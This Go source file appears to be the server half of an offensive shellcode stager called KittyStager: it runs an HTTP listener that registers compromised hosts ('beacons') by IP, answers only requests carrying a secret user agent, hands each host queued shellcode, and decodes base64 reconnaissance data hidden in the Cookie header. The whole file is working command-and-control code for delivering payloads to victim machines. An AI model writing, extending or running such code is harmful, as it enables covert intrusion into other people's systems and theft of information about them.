package http

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/util"
	b64 "encoding/base64"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"strings"
)

type kitten struct {
	target     string
	Shellcode  []byte
	id         int
	InitChecks util.InitialChecks
}

var (
	userA   string
	Targets map[string]*kitten
)

func (K *kitten) GetTarget() string {
	return K.target
}

func (K *kitten) GetShellcode() []byte {
	return K.Shellcode
}

func (K *kitten) GetId() int {
	return K.id
}

func (K *kitten) GetInitChecks() util.InitialChecks {
	return K.InitChecks
}

func CreateHttpServer(conf config.General) {
	Targets = map[string]*kitten{"all targets": {
		target:    "all targets",
		Shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
		id:        len(Targets),
	}}
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	addr := strings.Split(r.RemoteAddr, ":")
	//Check if the beacon is already in the map
	if _, ok := Targets[addr[0]]; ok {
		_, err := w.Write(Targets[addr[0]].GetShellcode())
		if err != nil {
			return
		}
		return
	} else {
		Targets[addr[0]] = &kitten{
			target:    addr[0],
			id:        len(Targets),
			Shellcode: Targets["all targets"].GetShellcode(), //Set the shellcode to the default sleep time
		}
		_, err := w.Write(Targets[addr[0]].GetShellcode())
		if err != nil {
			return
		}
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(addr[0]))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
		//Get recon data
		cookie := r.Header.Get("Cookie")
		if cookie != "" {
			out, err := b64.StdEncoding.DecodeString(cookie)
			Targets[addr[0]].InitChecks, err = util.UnmarshalJSON(out)
			if err != nil {
				fmt.Println(color.Red("Error decoding cookie"))
				return
			}
			err = util.PrintCookie(out)
			if err != nil {
				fmt.Println(color.Red("Error printing cookie"))
				return
			}
		}
	}
}
